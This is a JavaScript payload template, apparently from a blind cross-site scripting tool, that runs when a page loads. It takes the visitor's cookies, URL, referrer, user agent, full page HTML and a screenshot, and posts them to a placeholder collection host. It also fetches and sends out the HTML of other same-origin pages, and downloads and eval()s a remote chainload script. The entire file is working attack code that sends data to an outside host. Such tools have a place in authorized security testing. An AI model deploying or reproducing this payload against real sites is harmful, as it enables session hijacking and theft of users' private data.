var pgp_key = [PGP_REPLACE_ME];
var pgp_email_template = [TEMPLATE_REPLACE_ME];
var chainload_uri = [CHAINLOAD_REPLACE_ME];
var collect_page_list = [COLLECT_PAGE_LIST_REPLACE_ME];

function generate_pgp_encrypted_email( callback ) {
    var email_data = pgp_email_template;
    for ( var i in probe_return_data ) {
        if ( probe_return_data.hasOwnProperty( i ) ) {
            email_data = email_data.replace( '{{' + i + '}}', probe_return_data[i] );
        }
    }
    var public_key = openpgp.key.readArmored( pgp_key );
    openpgp.encryptMessage( public_key.keys, email_data ).then(function( pgp_message ) {
        callback( pgp_message );
    }).catch(function(error) {
        // Failed, nothing we can do.
    });
}

function get_guid() {
    var S4 = function() {
       return (((1+Math.random())*0x10000)|0).toString(16).substring(1);
    };
    return (S4()+S4()+"-"+S4()+"-"+S4()+"-"+S4()+"-"+S4()+S4()+S4());
}

function never_null( value ) {
    if( value !== undefined ) {
        return value;
    } else {
        return '';
    }
}

function contact_mothership( probe_return_data ) {
    var http = new XMLHttpRequest();
    var url = "[HOST_URL]/js_callback";
    http.open("POST", url, true);
    http.setRequestHeader("Content-type", "text/plain");
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {

        }
    }
    if( pgp_key == null || pgp_key == "" ) {
        http.send( JSON.stringify( probe_return_data ) );
    } else {
        generate_pgp_encrypted_email( function( pgp_message ){
            http.send( pgp_message )
        });
    }
}

function send_collected_page( page_data ) {
    var http = new XMLHttpRequest();
    var url = "[HOST_URL]/page_callback";
    http.open("POST", url, true);
    http.setRequestHeader("Content-type", "text/plain");
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {

        }
    }
    http.send( JSON.stringify( page_data ) );
}

function collect_page_data( path ) {
    try {
        var full_url = "//" + document.domain + path
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                page_data = {
                    "page_html": xhr.responseText,
                    "uri": full_url
                }
                send_collected_page( page_data );
            }
        }
        xhr.open('GET', full_url, true);
        xhr.send(null);
    } catch ( e ) {
    }
}

function collect_pages() {
    for( var i = 0; i < collect_page_list.length; i++ ) {
        // Make sure the path is correctly formatted
        if( collect_page_list[i].charAt(0) != "/" ) {
            collect_page_list[i] = "/" + collect_page_list[i];
        }
        collect_page_data( collect_page_list[i] );
    }
}

function eval_remote_source( uri ) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if ( xhr.readyState == XMLHttpRequest.DONE ) {
            eval( xhr.responseText );
        }
    }
    xhr.open( 'GET', uri, true );
    xhr.send( null );
}

function addEvent(element, eventName, fn) {
    if (element.addEventListener)
        element.addEventListener(eventName, fn, false);
    else if (element.attachEvent)
        element.attachEvent('on' + eventName, fn);
}

probe_return_data = {};

// Prevent failure incase the browser refuses to give us any of the probe data.
try {
    probe_return_data['uri'] = never_null( location.toString() );
} catch ( e ) {
    probe_return_data['uri'] = '';
}
try {
    probe_return_data['cookies'] = never_null( document.cookie );
} catch ( e ) {
    probe_return_data['cookies'] = '';
}
try {
    probe_return_data['referrer'] = never_null( document.referrer );
} catch ( e ) {
    probe_return_data['referrer'] = '';
}
try {
    probe_return_data['user-agent'] = never_null( navigator.userAgent );
} catch ( e ) {
    probe_return_data['user-agent'] = '';
}
try {
    probe_return_data['browser-time'] = never_null( ( new Date().getTime() ) );
} catch ( e ) {
    probe_return_data['browser-time'] = '';
}
try {
    probe_return_data['probe-uid'] = never_null( get_guid() );
} catch ( e ) {
    probe_return_data['probe-uid'] = '';
}
try {
    probe_return_data['origin'] = never_null( location.origin );
} catch ( e ) {
    probe_return_data['origin'] = '';
}
try {
    probe_return_data['injection_key'] = "[PROBE_ID]"
} catch ( e ) {
    probe_return_data['injection_key'] = '';
}

function hook_load_if_not_ready() {
    try {
        try {
            probe_return_data['dom'] = never_null( document.documentElement.outerHTML );
        } catch ( e ) {
            probe_return_data['dom'] = '';
        }
        html2canvas(document.body).then(function(canvas) {
            probe_return_data['screenshot'] = canvas.toDataURL();
            finishing_moves();
        });
    } catch( e ) {
        probe_return_data['screenshot'] = '';
        finishing_moves();
    }
}

function finishing_moves() {
    contact_mothership( probe_return_data );
    collect_pages();
    if( chainload_uri != "" && chainload_uri != null ) {
        eval_remote_source( chainload_uri );
    }
}

if( document.readyState == "complete" ) {
    hook_load_if_not_ready();
} else {
    addEvent( window, "load", function(){
        hook_load_if_not_ready();
    });
}
